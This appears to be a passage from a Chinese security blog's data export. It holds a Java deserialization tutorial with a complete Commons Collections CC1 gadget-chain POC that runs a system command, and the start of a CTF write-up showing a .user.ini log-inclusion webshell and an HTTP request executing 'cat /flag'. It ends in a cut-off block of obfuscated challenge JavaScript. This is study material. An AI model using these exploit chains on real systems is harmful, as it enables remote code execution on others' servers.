ois.readObject();\n    }\n}\n```\n\n至此链子就差不多做完了\n\n### 最终的链子1\n\nhttps://infernity.top/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/#%E9%93%BE%E5%AD%90%E6%80%9D%E8%B7%AF\n\n```java\nAnnotationInvocationHandler类\n\t-> readObject()\n\t\t-> setValue()\n\nTransformedMap类\n\t-> MapEntry类\n\t\t->checkSetValue()\n\t-> setValue()\n\t\nChainedTransformer类\n\t-> transform(Transformers[])\n\t\t-> ConstantTransformer类\n\t\t-> transform(Runtime.class)\n\nInvokerTransformer类\n\t-> transform(Runtime.class)\n\t\t-> getClass()\n\t\t-> getMethod()\n\t\t-> invoke()\n\t\t\t->exec()\n```\n\n\n\n另外还需要补充一个点，就是LazyMap利用链的触发\n\n## LazyMap利用链的触发\n\nhttps://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%A6%E4%B8%80%E6%9D%A1CC1%E9%93%BE/\n\n上面的CC1链是利用TransformedMap的checkSetValue方法来调用ChainedTransformer.transform\n\n而另一种写法是利用LazyMap.get方法走动态代理来调用ChainedTransformer.transform\n\n LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值，我们可以利用此来执行整个transform的整个利用过程，然后如何触发get方法的话，刚好之前的在`AnnotationInvocationHandler`类的`invoke`方法有调用到get\n\n### AnnotationInvocationHandler#invoke触发get\n\n![image-20250608105423717](../image/achieve/202411/java学习/image-20250608105423717.png)\n\n并且这里的memberValues是可控的，那我们看看get方法\n\n### LazyMap#get()触发transform\n\n![image-20250608105528641](../image/achieve/202411/java学习/image-20250608105528641.png)\n\n可以看到这里能调用transform方法，并且这个factory是可控的，也就是说到时候我们把factory的值传成ChainedTransformer，然后走进那个if里面就可以\n\n那该如何触发invoke呢\n\n在反序列化过程中，`Proxy` 代理对象的方法会被自动调用，而这些调用会被转发到 `AnnotationInvocationHandler#invoke()` 方法中。\n\n因此不难想到将`AnnotationInvocationHandler`用`Proxy`进行代理，那么在`readObject`的时候，只要调用任意方法，就会进入到 \n\n`AnnotationInvocationHandler#invoke` 方法中，进而触发我们的 `LazyMap#get`\n\n所以整条链的思路就是\n\n### 最终的链子2\n\n![image-20240417210451418](../image/achieve/202411/java学习/image-20240417210451418.png)\n\n所以最终的poc\n\n### 最终的POC2\n\n```java\npackage POC.CC1;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC1plus {\n    public static void main(String[] args) throws Exception {\n\n        //实例化Runtime对象并调用exec方法执行命令\n        Transformer[] Transformer = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getDeclaredMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),\n        };\n        Transformer chainedTransformer = new ChainedTransformer(Transformer);\n\n        //传入factory为chainedTransformer\n        HashMap<Object,Object> map = new HashMap<>();\n        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);\n\n        //Proxy动态代理\n        Class handler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor constructorhandler = handler.getDeclaredConstructor(Class.class, Map.class);\n        constructorhandler.setAccessible(true);\n        InvocationHandler invocationHandler = (InvocationHandler) constructorhandler.newInstance(Override.class,lazyMap);\n        Map proxyedMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);\n\n        Object obj = constructorhandler.newInstance(Override.class,proxyedMap);\n\n        serialize(obj);\n        unserialize(\"CC1plus.txt\");\n\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"CC1plus.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n```java\n/*\n\tGadget chain:\n\t\tObjectInputStream.readObject()\n\t\t\tAnnotationInvocationHandler.readObject()\n\t\t\t\tMap(Proxy).entrySet()\n\t\t\t\t\tAnnotationInvocationHandler.invoke()\n\t\t\t\t\t\tLazyMap.get()\n\t\t\t\t\t\t\tChainedTransformer.transform()\n\t\t\t\t\t\t\t\tConstantTransformer.transform()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tClass.getMethod()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.exec()\n\tRequires:\n\t\tcommons-collections\n */\n```\n\n## 0x05版本修复\n\n在jdk8u_71之后，AnnotationInvocationHandler类被重写了，修改了readObject方法，里面没有了setValue方法。\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"第三届黄河CTF","url":"/2025/05/24/第三届黄河CTF/","content":"\n## web\n\n### 奶龙牌图片处理器2.0\n\n一个文件上传，有后缀名检测，然后内容过滤了php和?号\n\n看到中间件是nginx，直接用.user.ini包含日志文件，发现可以包含\n\n![image-20250524095528031](../image/achieve/202411/黄河CTF/image-20250524095528031.png)\n\n 然后在UA头传马子，然后RCE就行了\n\n```html\nPOST /uploads/ HTTP/1.1\nHost: 175.27.251.122:32933\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 26\n\ncmd=system(\"cat%20/flag\");\n```\n\n### 外国山海经\n\n扫目录发现存在/robots.txt文件，访问一下\n\n```\n#shu.php  sha.php  wa.php  flag.php  flag.php.swp\n```\n\n有flag.php，访问后在源码中拿到\n\n```js\n    (function(_0x5bfa63,_0x281ba4){var _0x628a90={_0x28e595:0x190,_0x466706:0x17a,_0x570276:0x192,_0x4e238d:0x128,_0xf7fd91:0x139,_0x4ff7de:0x144,_0xf17c9a:0x132,_0x140c6f:0x117,_0x2e9d5d:0x124,_0x27ecfb:0x16f,_0x1f08ae:0x16e,_0x429bb1:0x185,_0x5259a4:0x186,_0xf069bc:0xfc,_0x36775b:0xda,_0x1a81bc:0x101,_0x4fbeb3:0x159,_0x5f0ac4:0x16a,_0x2b1d0c:0x15f,_0x45b6b4:0x160,_0x542167:0x17c,_0x300668:0x15a,_0x5d82fc:0x13b,_0x4fc9cc:0x176,_0x1f53f0:0x146,_0x99afde:0xfe,_0x39b153:0xf0,_0xed7676:0xef,_0x3a214b:0x10c,_0x18fd83:0x115,_0x44ec87:0x166,_0x3009e4:0x163,_0x362ea9:0x170},_0x28823e={_0x456064:0x20a},_0xb2ea4e={_0x332eb1:0x262};function _0x5afd48(_0x372bcf,_0x587d2c,_0x343524,_0x7ab981){return _0x2fa2(_0x7ab981- -_0xb2ea4e._0x332eb1,_0x343524);}var _0x19cd46=_0x5bfa63();function _0x180c55(_0x65cbe3,_0x1b7dab,_0x513f23,_0x2e4568){return _0x2fa2(_0x65cbe3- -_0x28823e._0x456064,_0x2e4568);}while(!![]){try{var _0x27e61b=parseInt(_0x5afd48(-0x18e,-_0x628a90._0x28e595,-_0x628a90._0x466706,-_0x628a90._0x570276))/(0x1f33+-0xda2+-0x1190)*(-parseInt(_0x180c55(-_0x628a90._0x4e238d,-_0x628a90._0xf7fd91,-_0x628a90._0x4ff7de,-_0x628a90._0xf17c9a))/(-0x97e*-0x2+0x8*-0x98+0x25f*-0x6))+parseInt(_0x180c55(-0x10d,-_0x628a90._0x140c6f,-0x111,-_0x628a90._0x2e9d5d))/(-0x115*-0xa+-0x63b+-0x24a*0x2)*(parseInt(_0x5afd48(-_0x628a90._0x27ecfb,-_0x628a90._0x1f08ae,-_0x628a90._0x429bb1,-_0x628a90._0x5259a4))/(-0x95+0x6c0+-0x627))+parseInt(_0x180c55(-_0x628a90._0xf069bc,-0x108,-_0x628a90._0x36775b,-_0x628a90._0x1a81bc))/(0x14ca+0xf94+-0x2459)+-parseInt(_0x5afd48(-_0x628a90._0x4fbeb3,-0x151,-_0x628a90._0x5f0ac4,-0x167))/(0x11ed+0x1133+-0x118d*0x2)*(-parseInt(_0x5afd48(-_0x628a90._0x2b1d0c,-_0x628a90._0x45b6b4,-_0x628a90._0x542167,-_0x628a90._0x300668))/(0x1d5*-0x6+0x1*-0x6dd+0x11e2))+-parseInt(_0x5afd48(-_0x628a90._0x5d82fc,-_0x628a90._0x4fc9cc,-_0x628a90._0x1f53f0,-0x157))/(-0x475+-0x172a+0x1ba7)*(parseInt(_0x180c55(-_0x628a90._0x99afde,-_0x628a90._0x39b153,-_0x628a90._0xed7676,-0xde))/(0x1caa+0x8ed+0xd1*-0x2e))+parseInt(_0x180c55(-_0x628a90._0x3a214b,-0x119,-0xee,-_0x628a90._0x18fd83))/(-0x687+-0x7c8+0xe59*0x1)*(-parseInt(_0x5afd48(-0x16c,-0x179,-_0x628a90._0x44ec87,-_0x628a90._0x3009e4))/(-0xdba*-0x2+-0x21bd+-0xc*-0x87))+parseInt(_0x5afd48(-_0x628a90._0x362ea9,-_0x628a90._0x3009e4,-0x174,-0x182))/(0xc54+-0x91*0x1+0xbb7*-0x1);if(_0x27e61b===_0x281ba4)break;else _0x19cd46['push'](_0x19cd46['shift']());}catch(_0x412f22){_0x19cd46['push'](_0x19cd46['shift']());}}}(_0x219d,-0x318d8+-0x1*-0x54f5+0x75601));var _0x3587de=(function(){var _0x4021ac={_0x58c1ae:0x13d,_0x3c3fdf:0x15a,_0x51959f:0x136,_0x1a346a:0x267,_0x970c7c:0x26b,_0x450fa8:0x27d,_0x3dffdb:0x27c,_0x20c184:0x295,_0x1d0c10:0x262,_0x1fdb73:0x130,_0x5a02fe:0x119,_0x4ee755:0x111,_0x5226ab:0x11b,_0xee055f:0x28b,_0xede8f3:0x252,_0x7e624b:0x143,_0x446a52:0x138,_0x308418:0x139,_0x4ebdea:0x27e,_0x26518b:0x29b,_0x51d380:0x28a,_0x18efbb:0x275,_0x1d15b8:0x13f,_0x1ab8ab:0x126,_0x20ee91:0x13e,_0x5cc3e2:0x157,_0x330753:0x260,_0x182013:0x272,_0x217183:0x27b,_0x3d043a:0x26c},_0x5724b4={_0x2f801f:0x22a,_0x3e3ff7:0x225,_0x4592b5:0x229,_0x23ef8d:0x23d,_0x4d4486:0x243,_0x1c90a0:0x220,_0x16effd:0x251,_0x4453ae:0x22f,_0x53295a:0x250},_0xb6c053={_0x43286b:0x152,_0x21fedd:0x13b,_0x2988ea:0x131,_0x3ae920:0x10e,_0x17968e:0xfb,_0x1b699f:0x14d,_0x5ccb44:0x146,_0x1270f6:0x15c,_0x44b00d:0x166,_0x147a9c:0x14e,_0x2e7542:0x134,_0x309998:0x14b,_0x5ee480:0x13f,_0x57614d:0x11f,_0xb63fe0:0x145,_0x18adec:0x114,_0x2d16b8:0x12a,_0x2e4b10:0x13e,_0x45c809:0x168,_0x2bfc7e:0x14f,_0x160f3a:0x159,_0x5e2224:0x167,_0x1d2868:0x152,_0x5909a1:0x130,_0x4a17f6:0x154,_0x3cdbb1:0x157,_0x23ed39:0x15a,_0x251934:0x12b,_0x37334a:0x156,_0x2aac5c:0x13b,_0x343854:0x157,_0x20b51c:0x16e,_0x1c1154:0x115,_0x6f8a3:0x12b,_0x2cdd60:0x13c},_0x141051={_0x4c0a4c:0x3e5,_0x5af9da:0x181},_0x331a16={_0x3b625e:0x235};function _0x16015f(_0x47cbe1,_0x203be2,_0x42df40,_0x2fc801){return _0x2fa2(_0x47cbe1- -_0x331a16._0x3b625e,_0x203be2);}var _0x1e85cf={};_0x1e85cf[_0x16015f(-_0x4021ac._0x58c1ae,-0x124,-_0x4021ac._0x3c3fdf,-_0x4021ac._0x51959f)]=function(_0x124e68,_0x375486){return _0x124e68!==_0x375486;};function _0x1d0710(_0x534c0e,_0xd016c3,_0x1cb96e,_0x177622){return _0x2fa2(_0x534c0e- -0x361,_0x1cb96e);}_0x1e85cf['bhVnY']=_0x1d0710(-_0x4021ac._0x1a346a,-0x282,-_0x4021ac._0x970c7c,-_0x4021ac._0x450fa8),_0x1e85cf[_0x1d0710(-_0x4021ac._0x3dffdb,-0x288,-_0x4021ac._0x20c184,-_0x4021ac._0x1d0c10)]=function(_0xf0c5e5,_0x41f4ee){return _0xf0c5e5===_0x41f4ee;},_0x1e85cf['FroGP']=_0x16015f(-_0x4021ac._0x1fdb73,-_0x4021ac._0x5a02fe,-_0x4021ac._0x4ee755,-_0x4021ac._0x5226ab),_0x1e85cf[_0x1d0710(-0x272,-_0x4021ac._0x20c184,-_0x4021ac._0xee055f,-_0x4021ac._0xede8f3)]=_0x16015f(-_0x4021ac._0x7e624b,-0x164,-_0x4021ac._0x446a52,-_0x4021ac._0x308418),_0x1e85cf[_0x1d0710(-_0x4021ac._0x4ebdea,-_0x4021ac._0x26518b,-_0x4021ac._0x51d380,-_0x4021ac._0x18efbb)]=function(_0x558755,_0x4bc882){return _0x558755===_0x4bc882;},_0x1e85cf[_0x16015f(-_0x4021ac._0x1d15b8,-_0x4021ac._0x1ab8ab,-_0x4021ac._0x20ee91,-_0x4021ac._0x5cc3e2)]=_0x1d0710(-_0x4021ac._0x330753,-_0x4021ac._0x182013,-_0x4021ac._0x217183,-_0x4021ac._0x3d043a);var _0x21f727=_0x1e85cf,_0x14c4a4=!![];return function(_0x1c40d7,_0x5cfc78){var _0x1d01a4={_0x493447:0x4a8};function _0x1cff74(_0x4d24a1,_0x343770,_0xfafe,_0x1eb6dc){return _0x1d0710(_0x4d24a1-_0x1d01a4._0x493447,_0x343770-0x46,_0x343770,_0x1eb6dc-0x190);}function _0x1c96af(_0x893911,_0x2291a8,_0x287241,_0x317f06){return _0x16015f(_0x317f06-_0x141051._0x4c0a4c,_0x287241,_0x287241-_0x141051._0x5af9da,_0x317f06-0x3b);}if(_0x21f727[_0x1cff74(_0x5724b4._0x2f801f,_0x5724b4._0x3e3ff7,_0x5724b4._0x4592b5,0x212)](_0x21f727[_0x1cff74(_0x5724b4._0x23ef8d,_0x5724b4._0x4d4486,_0x5724b4._0x1c90a0,_0x5724b4._0x16effd)],_0x21f727[_0x1cff74(0x23d,_0x5724b4._0x4453ae,_0x5724b4._0x53295a,0x25d)])){var _0x3a58cc=_0x14c4a4?function(){var _0x5c15d6={_0x4a8bea:0x15e,_0x38712d:0x30};function _0x140275(_0x526de1,_0x462836,_0x5d2e48,_0xcb505a){return _0x1c96af(_0x526de1-0x1d2,_0x462836-0x166,_0x462836,_0x5d2e48- -0x3c4);}function _0x575be4(_0xaacffc,_0x4294bf,_0x5d7f4c,_0x222164){return _0x1cff74(_0x4294bf- -0x37a,_0xaacffc,_0x5d7f4c-_0x5c15d6._0x4a8bea,_0x222164-_0x5c15d6._0x38712d);}if(_0x21f727[_0x575be4(-_0xb6c053._0x43286b,-_0xb6c053._0x21fedd,-0x12d,-_0xb6c053._0x2988ea)](_0x140275(-0x121,-_0xb6c053._0x3ae920,-0x11a,-_0xb6c053._0x17968e),_0x21f727[_0x140275(-0x153,-_0xb6c053._0x1b699f,-_0xb6c053._0x5ccb44,-_0xb6c053._0x1270f6)])){if(_0x2919f7){var _0x493883=_0xc6e29b['apply'](_0x4d40d9,arguments);return _0x35dcd6=null,_0x493883;}}else{if(_0x5cfc78){if(_0x21f727[_0x575be4(-_0xb6c053._0x44b00d,-_0xb6c053._0x147a9c,-_0xb6c053._0x2e7542,-0x168)](_0x21f727[_0x575be4(-_0xb6c053._0x309998,-_0xb6c053._0x5ee480,-_0xb6c053._0x57614d,-_0xb6c053._0xb63fe0)],_0x21f727['mGUiQ'])){var _0xa14e48=(_0x575be4(-_0xb6c053._0x18adec,-_0xb6c053._0x2d16b8,-0x12d,-_0xb6c053._0x2e4b10)+'4')['split']('|'),_0x2e30e9=-0x384+-0x1751+0x1ad5;while(!![]){switch(_0xa14e48[_0x2e30e9++]){case'0':var _0x1b7aa8=_0x59608f[_0x105f60]||_0xfc9fa9;continue;case'1':_0xfc9fa9['__proto__']=_0x20b288[_0x575be4(-_0xb6c053._0x45c809,-_0xb6c053._0x2bfc7e,-0x16e,-_0xb6c053._0x160f3a)](_0xd5c9ab);continue;case'2':var _0xfc9fa9=_0x55e4f3[_0x575be4(-_0xb6c053._0x5e2224,-_0xb6c053._0x1d2868,-_0xb6c053._0x5909a1,-_0xb6c053._0x4a17f6)+'r'][_0x575be4(-_0xb6c053._0x3cdbb1,-0x14b,-0x157,-_0xb6c053._0x5909a1)]['bind'](_0x22afd3);continue;case'3':var _0x105f60=_0x17d803[_0x3e5e3b];continue;case'4':_0x38656c[_0x105f60]=_0xfc9fa9;continue;case'5':_0xfc9fa9[_0x575be4(-_0xb6c053._0x3cdbb1,-_0xb6c053._0x23ed39,-_0xb6c053._0x21fedd,-_0xb6c053._0x44b00d)]=_0x1b7aa8[_0x140275(-_0xb6c053._0x251934,-_0xb6c053._0x37334a,-_0xb6c053._0x2aac5c,-0x118)][_0x575be4(-_0xb6c053._0x343854,-_0xb6c053._0x2bfc7e,-0x16b,-_0xb6c053._0x20b51c)](_0x1b7aa8);continue;}break;}}else{var _0x32d595=_0x5cfc78[_0x140275(-0x117,-_0xb6c053._0x1c1154,-_0xb6c053._0x6f8a3,-_0xb6c053._0x2cdd60)](_0x1c40d7,arguments);return _0x5cfc78=null,_0x32d595;}}}}:function(){};return _0x14c4a4=![],_0x3a58cc;}else _0xddb414=_0x3a1bf6;};}()),_0x5c1b7b=_0x3587de(this,function(){var _0x5ece5d={_0x4eda33:0x2a1,_0x4b8ce9:0x2aa,_0x23b363:0x2ae,_0x1c5de6:0x2b1,_0x18d716:0x4c6,_0x3a6307:0x4d1,_0x407b77:0x4c2,_0x4321fa:0x4d7,_0x341b4a:0x4b7,_0x48a6f0:0x49b,_0x519cab:0x490,_0x188735:0x298,_0x2797a6:0x2aa,_0x2468a3:0x27d,_0x3991c5:0x2b8,_0x4757e1:0x297,_0x36d645:0x29a,_0x3fe288:0x29f,_0x577630:0x4c2,_0x44c1c6:0x4a0,_0x26d6ba:0x4a2,_0x620647:0x4a0,_0x5471aa:0x28d,_0x4472b7:0x2a5,_0x5e590d:0x27e,_0x54bbea:0x4b3,_0x229042:0x4ac,_0x5d3eca:0x4ce,_0x80fb42:0x4bf,_0x1d559a:0x4bc,_0x1383bd:0x49d,_0x171396:0x49f},_0x3c7431={_0x4da769:0x3c7},_0x335210={_0x313b76:0x1ac};function _0x249218(_0x4c60fc,_0x6b220d,_0x3984ce,_0x10467c){return _0x2fa2(_0x4c60fc-_0x335210._0x313b76,_0x6b220d);}var _0x477b54={};_0x477b54[_0x249218(_0x5ece5d._0x4eda33,_0x5ece5d._0x4b8ce9,_0x5ece5d._0x23b363,_0x5ece5d._0x1c5de6)]=_0xfd96cd(_0x5ece5d._0x18d716,_0x5ece5d._0x3a6307,_0x5ece5d._0x407b77,_0x5ece5d._0x4321fa)+'+$';var _0x8ff005=_0x477b54;function _0xfd96cd(_0x110bc0,_0x4464b2,_0x10016b,_0x18ba04){return _0x2fa2(_0x4464b2-_0x3c7431._0x4da769,_0x110bc0);}return _0x5c1b7b[_0xfd96cd(_0x5ece5d._0x341b4a,0x4a0,_0x5ece5d._0x48a6f0,_0x5ece5d._0x519cab)]()[_0x249218(_0x5ece5d._0x188735,_0x5ece5d._0x2797a6,_0x5ece5d._0x2468a3,_0x5ece5d._0x3991c5)](_0x249218(0x2b6,_0x5ece5d._0x4757e1,_0x5ece5d._0x36d645,_0x5ece5d._0x3fe288)+'+$')[_0xfd96cd(_0x5ece5d._0x577630,_0x5ece5d._0x44c1c6,_0x5ece5d._0x26d6ba,_0x5ece5d._0x620647)]()[_0x249218(_0x5ece5d._0x5471aa,_0x5ece5d._0x4472b7,_0x5ece5d._0x4757e1,_0x5ece5d._0x5e590d)+'r'](_0x5c1b7b)[_0xfd96cd(0x4ba,_0x5ece5d._0x54bbea,_0x5ece5d._0x229042,_0x5ece5d._0x5d3eca)](_0x8ff005[_0xfd96cd(_0x5ece5d._0x80fb42,_0x5ece5d._0x1d559a,_0x5ece5d._0x1383bd,_0x5ece5d._0x171396)]);});_0x5c1b7b();function _0x2fa2(_0x4dde84,_0x478812){var _0x29462c=_0x219d();return _0x2fa2=function(_0x1089fd,_0x5a8a3d){_0x1089fd=_0x1089fd-(-0x4be*0x7+0x1bf5+-0x7*-0xdd);var _0x32bbf7=_0x29462c[_0x1089fd];if(_0x2fa2['MPcALq']===undefined){var _0x27114c=function(_0x1cfff3){var _0x30a4cb='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x15567f='',_0x3c3450='',_0x3727b6=_0x15567f+_0x27114c;for(var _0x5b35e=0x2465+0x4c9+-0x6dd*0x6,_0x305da,_0x2e25de,_0x45e1da=0x13a8+-0x1e99+-0x1*-0xaf1;_0x2e25de=_0x1cfff3['charAt'](_0x45e1da++);~_0x2e25de&&(_0x305da=_0x5b35e%(-0x8e1*-0x2+0x18ab+-0x2a69)?_0x305da*(-0x4ff+-0x2*-0x781+-0x9c3)+_0x2e25de:_0x2e25de,_0x5b35e++%(0x150+0x7*0x2a5+-0x13cf))?_0x15567f+=_0x3727b6['charCodeAt'](_0x45e1da+(-0x1a6c*0x1+0xaab+0xfcb))-(0x21f7+0x1d4c+-0x3f39)!==-0x2d+-0x133a+0x1*0x1367?String['fromCharCode'](0x1c0+-0x1db4+0x1cf3*0x1&_0x305da>>(-(0x52c+-0x1807+0x12dd)*_0x5b35e&0x1771*0x1+-0xf5c*0x2+0x74d)):_0x5b35e:-0x197e+0x12c5+-0x6b9*-0x1){_0x2e25de=_0x30a4cb['indexOf'](_0x2e25de);}for(var _0x3bef59=0x387+0xeea+-0x1271,_0x1b19f0=_0x15567f['length'];_0x3bef59<_0x1b19f0;_0x3bef59++){_0x3c3450+='%'+('00'+_0x15567f['charCodeAt'](_0x3bef59)['toString'](-0x3*0x9c1+-0x1*-0x17b9+-0x1de*-0x3))['slice'](-(-0x1dd*-0xd+0x50f+-0x1d46));}return decodeURIComponent(_0x3c3450);};_0x2fa2['iNUHtA']=_0x27114c,_0x4dde84=arguments,_0x2fa2['MPcALq']=!![];}var _0x1cf422=_0x29462c[0x23d9+-0x18fd+-0x5*0x22c],_0xf7632=_0x1089fd+_0x1cf422,_0x5c718f=_0x4dde84[_0xf7632];if(!_0x5c718f){var _0x4e8342=function(_0x5bb17b){this['vOUKmO']=_0x5bb17b,this['VyUlWP']=[0x1e*-0x12d+0x1bf2+-0x1*-0x755,-0x259b+-0x167*0x5+-0x164f*-0x2,-0x1*-0x88a+-0x15d0*0x1+0xd46],this['RgxWRj']=function(){return'newState';},this['lwrkKC']='\\x5cw+\\x20*\\x5c(\\x5c)\\x20*{\\x5cw+\\x20*',this['IbivLK']='[\\x27|\\x22].+[\\x27|\\x22];?\\x20*}';};_0x4e8342['prototype']['wDfUYW']=function(){var _0x47b17d=new RegExp(this['lwrkKC']+this['IbivLK']),_0x3d3b23=_0x47b17d['test'](this['RgxWRj']['toString']())?--this['VyUlWP'][0x82c+-0x2036+0x180b]:--this['VyUlWP'][0xc07+0x2228+0x3*-0xf65];return this['VDwzLi'](_0x3d3b23);},_0x4e8342['prototype']['VDwzLi']=function(_0xa402ba){if(!Boolean(~_0xa402ba))return _0xa402ba;return this['xwZujq'](this['vOUKmO']);},_0x4e8342['prototype']['xwZujq']=function(_0x65f30f){for(var _0x23db3e=-0x2*-0x1304+-0x1*-0x19b+-0x27a3,_0x1e8117=this['VyUlWP']['length'];_0x23db3e<_0x1e8117;_0x23db3e++){this['VyUlWP']['push'](Math['round'](Math['random']())),_0x1e8117=this['VyUlWP']['length'];}return _0x65f30f(this['VyUlWP'][-0x3a2+0x779*0x1+-0x3d7]);},new _0x4e8342(_0x2fa2)['wDfUYW'](),_0x32bbf7=_0x2fa2['iNUHtA'](_0x32bbf7),_0x4dde84[_0xf7632]=_0x32bbf7;}else _0x32bbf7=_0x5c718f;return _0x32bbf7;},_0x2fa2(_0x4dde84,_0x478812);}var _0x335615=(function(){var _0x3d32fd={_0x4dd412:0x4b3,_0x2e30cb:0x4c9,_0x1d7e3f:0x4b3,_0x505055:0x49c,_0x898066:0x36,_0x437ed2:0x24,_0xb80b08:0x4c1,_0x41955e:0x4b5,_0x226e13:0x4b8,_0x527505:0x4ba,_0x45ce2c:0x4de,_0x16e492:0x4dd,_0x165aa5:0x4e0,_0x3511bd:0x502},_0x42d65f={_0x2ddf3c:0xd0,_0x402929:0xcd,_0x4f6aa1:0xf0,_0x417947:0xc0,_0x5c83e3:0xcf,_0x3fcd55:0xf3,_0x30ce5c:0xde,_0x264507:0xff,_0x1c0668:0x93,_0x4241c9:0x97,_0x1e3a87:0x83,_0x37379e:0xf2,_0x50678c:0xcb,_0x3df9e5:0xdc,_0x19ebaf:0xd3,_0x4ec263:0xa0,_0x1f45ec:0xcc,_0x2e359a:0x11b,_0x1bb5a5:0x123,_0x498c1f:0xed,_0x5c94ca:0x111},_0x217b59={_0x138f06:0x1cf,_0x327865:0x38,_0x1b3b35:0xf9},_0x2789f1={_0x22fbb1:0x5f,_0x3fd558:0x3e5,_0x3623a4:0x1cd},_0x2087ec={_0x33f829:0xb4},_0x147f99={};function _0x3bef6d(_0x5b56d3,_0x3a091c,_0x130de8,_0x562c6f){return _0x2fa2(_0x562c6f- -_0x2087ec._0x33f829,_0x5b56d3);}_0x147f99[_0x3ca6da(_0x3d32fd._0x4dd412,_0x3d32fd._0x2e30cb,_0x3d32fd._0x1d7e3f,_0x3d32fd._0x505055)]=_0x3bef6d(_0x3d32fd._0x898066,0xb,0x24,_0x3d32fd._0x437ed2);function _0x3ca6da(_0x3fe9d1,_0xe366d9,_0x25f5a3,_0x379f71){return _0x2fa2(_0x25f5a3-0x3e4,_0xe366d9);}_0x147f99[_0x3ca6da(_0x3d32fd._0xb80b08,_0x3d32fd._0x41955e,_0x3d32fd._0x226e13,_0x3d32fd._0x527505)]=_0x3ca6da(_0x3d32fd._0x45ce2c,_0x3d32fd._0x16e492,0x4ce,0x4d0),_0x147f99['ZZqwF']=_0x3ca6da(_0x3d32fd._0x45ce2c,_0x3d32fd._0xb80b08,_0x3d32fd._0x165aa5,_0x3d32fd._0x3511bd);var _0x3d4fb9=_0x147f99,_0x3b189a=!![];return function(_0x4c04a2,_0x24bac0){var _0x11031c={_0x14b596:0xd,_0x170af6:0x1a,_0x3a5b25:0x4,_0x46e1f8:0x2a,_0x117854:0x30,_0x53a9fb:0x38,_0x5455dc:0x4a,_0x2b5959:0x29,_0x34c283:0x10,_0x1d9e57:0x4ed,_0xb9a172:0x4ff,_0xe479af:0x4ea,_0x4adc73:0x22,_0x426376:0x41,_0x5ddded:0x3e},_0x49bbd1={};function _0x4145d7(_0x509318,_0x4ce127,_0x11b7da,_0x381469){return _0x3ca6da(_0x509318-_0x2789f1._0x22fbb1,_0x11b7da,_0x381469- -_0x2789f1._0x3fd558,_0x381469-_0x2789f1._0x3623a4);}_0x49bbd1[_0x4145d7(0xd0,_0x42d65f._0x2ddf3c,_0x42d65f._0x402929,_0x42d65f._0x4f6aa1)]=function(_0x1d942d,_0x50c3e4){return _0x1d942d===_0x50c3e4;};function _0x472cde(_0x277dde,_0x742ce5,_0x42937a,_0x202bcf){return _0x3bef6d(_0x277dde,_0x742ce5-_0x217b59._0x138f06,_0x42937a-_0x217b59._0x327865,_0x42937a- -_0x217b59._0x1b3b35);}_0x49bbd1[_0x472cde(-_0x42d65f._0x417947,-_0x42d65f._0x402929,-_0x42d65f._0x5c83e3,-0xad)]=_0x3d4fb9[_0x472cde(-_0x42d65f._0x3fcd55,-0xf1,-_0x42d65f._0x30ce5c,-_0x42d65f._0x264507)],_0x49bbd1[_0x472cde(-_0x42d65f._0x1c0668,-_0x42d65f._0x4241c9,-0x9d,-_0x42d65f._0x1e3a87)]=_0x3d4fb9[_0x4145d7(_0x42d65f._0x37379e,_0x42d65f._0x50678c,_0x42d65f._0x3df9e5,_0x42d65f._0x19ebaf)],_0x49bbd1['JvBtk']=_0x3d4fb9[_0x472cde(-_0x42d65f._0x4ec263,-_0x42d65f._0x1f45ec,-0xbf,-0xd0)],_0x49bbd1[_0x4145d7(_0x42d65f._0x2e359a,_0x42d65f._0x1bb5a5,_0x42d65f._0x498c1f,0x10e)]=_0x4145d7(0x11a,_0x42d65f._0x5c94ca,0xfd,0x110);var 